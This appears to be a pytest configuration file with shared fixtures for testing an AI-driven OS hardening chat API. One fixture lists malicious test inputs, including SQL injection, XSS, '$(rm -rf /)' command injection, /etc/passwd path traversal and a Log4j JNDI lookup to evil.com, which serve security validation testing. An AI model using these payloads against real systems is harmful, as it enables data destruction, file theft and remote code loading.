"""
Pytest Configuration and Shared Fixtures
Professional Test Suite - AI-Powered OS Hardening
"""

import pytest
import sys
from pathlib import Path
from typing import Dict, Any
from fastapi.testclient import TestClient

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))


# ============================================================================
# Application Fixtures
# ============================================================================

@pytest.fixture(scope="session")
def app():
    """FastAPI application instance (session-scoped)"""
    from main import app
    return app


@pytest.fixture(scope="function")
def client(app) -> TestClient:
    """Test client for API testing (function-scoped)"""
    with TestClient(app) as test_client:
        yield test_client


# ============================================================================
# Configuration Fixtures
# ============================================================================

@pytest.fixture(scope="session")
def config():
    """Application configuration"""
    from config.config_loader import get_config
    return get_config()


@pytest.fixture(scope="function")
def test_config() -> Dict[str, Any]:
    """Test-specific configuration"""
    return {
        "security_level": "balanced",
        "zt_maturity": "medium",
        "os": "ubuntu_24_04",
        "role": "sysadmin",
        "use_rag": True,
        "rag_top_k": 5,
        "rag_min_score": 0.7,
        "timeout": 60
    }


# ============================================================================
# Test Data Fixtures
# ============================================================================

@pytest.fixture
def sample_questions() -> Dict[str, str]:
    """Sample questions for different intents"""
    return {
        "greeting": "Hello there!",
        "thanks": "Thank you very much!",
        "farewell": "Goodbye!",
        "help": "Can you help me?",
        "info_request": "What are SSH hardening best practices?",
        "action_request": "Generate a bash script to configure firewall",
        "out_of_scope": "What is the capital of France?"
    }


@pytest.fixture
def sample_rag_queries() -> list[str]:
    """Sample RAG queries"""
    return [
        "firewall configuration",
        "SSH security best practices",
        "password policy requirements",
        "audit logging configuration",
        "file permissions hardening"
    ]


@pytest.fixture
def valid_chat_request() -> Dict[str, Any]:
    """Valid chat request payload"""
    return {
        "question": "How to harden SSH on Ubuntu 24.04?",
        "os": "ubuntu_24_04",
        "role": "sysadmin",
        "security_level": "balanced",
        "zt_maturity": "medium",
        "use_rag": True,
        "rag_top_k": 5,
        "rag_min_score": 0.7,
        "stream": False,
        "timeout": 60
    }


@pytest.fixture
def invalid_chat_requests() -> list[Dict[str, Any]]:
    """Invalid chat request payloads for validation testing"""
    return [
        {},  # Empty request
        {"question": ""},  # Empty question
        {"question": "a" * 5001},  # Too long
        {"question": "test", "security_level": "invalid"},  # Invalid security level
        {"question": "test", "zt_maturity": "super_high"},  # Invalid ZT maturity
        {"question": "test", "rag_top_k": 50},  # Invalid top_k (>20)
        {"question": "test", "rag_min_score": -0.5},  # Negative score
        {"question": "test", "timeout": 500},  # Timeout too high
    ]


@pytest.fixture
def malicious_inputs() -> list[str]:
    """Malicious inputs for security testing"""
    return [
        "'; DROP TABLE users; --",  # SQL injection
        "<script>alert('XSS')</script>",  # XSS
        "$(rm -rf /)",  # Command injection
        "../../../etc/passwd",  # Path traversal
        "' OR '1'='1",  # SQL injection variant
        "${jndi:ldap://evil.com/a}",  # Log4j
    ]


# ============================================================================
# Pytest Hooks
# ============================================================================

def pytest_configure(config):
    """Pytest configuration hook"""
    reports_dir = Path("tests/reports")
    reports_dir.mkdir(exist_ok=True, parents=True)


def pytest_collection_modifyitems(config, items):
    """Modify test collection"""
    for item in items:
        if "unit" in str(item.fspath):
            item.add_marker(pytest.mark.unit)
        elif "integration" in str(item.fspath):
            item.add_marker(pytest.mark.integration)
        elif "blackbox" in str(item.fspath):
            item.add_marker(pytest.mark.blackbox)
        elif "whitebox" in str(item.fspath):
            item.add_marker(pytest.mark.whitebox)
        elif "e2e" in str(item.fspath):
            item.add_marker(pytest.mark.e2e)
        elif "performance" in str(item.fspath):
            item.add_marker(pytest.mark.performance)

        if "api" in str(item.fspath) or "router" in str(item.nodeid):
            item.add_marker(pytest.mark.api)

        if "llm" in str(item.fspath) or "pipeline" in str(item.nodeid):
            item.add_marker(pytest.mark.llm)

        if "rag" in str(item.fspath) or "rag" in str(item.nodeid):
            item.add_marker(pytest.mark.rag)


def pytest_report_header(config):
    """Add custom header to test report"""
    return [
        "AI-Powered OS Hardening - Professional Test Suite",
        "=" * 80,
        "Test Categories: Unit, Integration, Black-box, White-box, E2E, Performance",
        "Coverage Target: 80%+",
        "=" * 80,
    ]


def pytest_terminal_summary(terminalreporter, exitstatus, config):
    """Add custom summary to terminal output"""
    if exitstatus == 0:
        terminalreporter.write_sep("=", "ALL TESTS PASSED", green=True, bold=True)
    else:
        terminalreporter.write_sep("=", "SOME TESTS FAILED", red=True, bold=True)
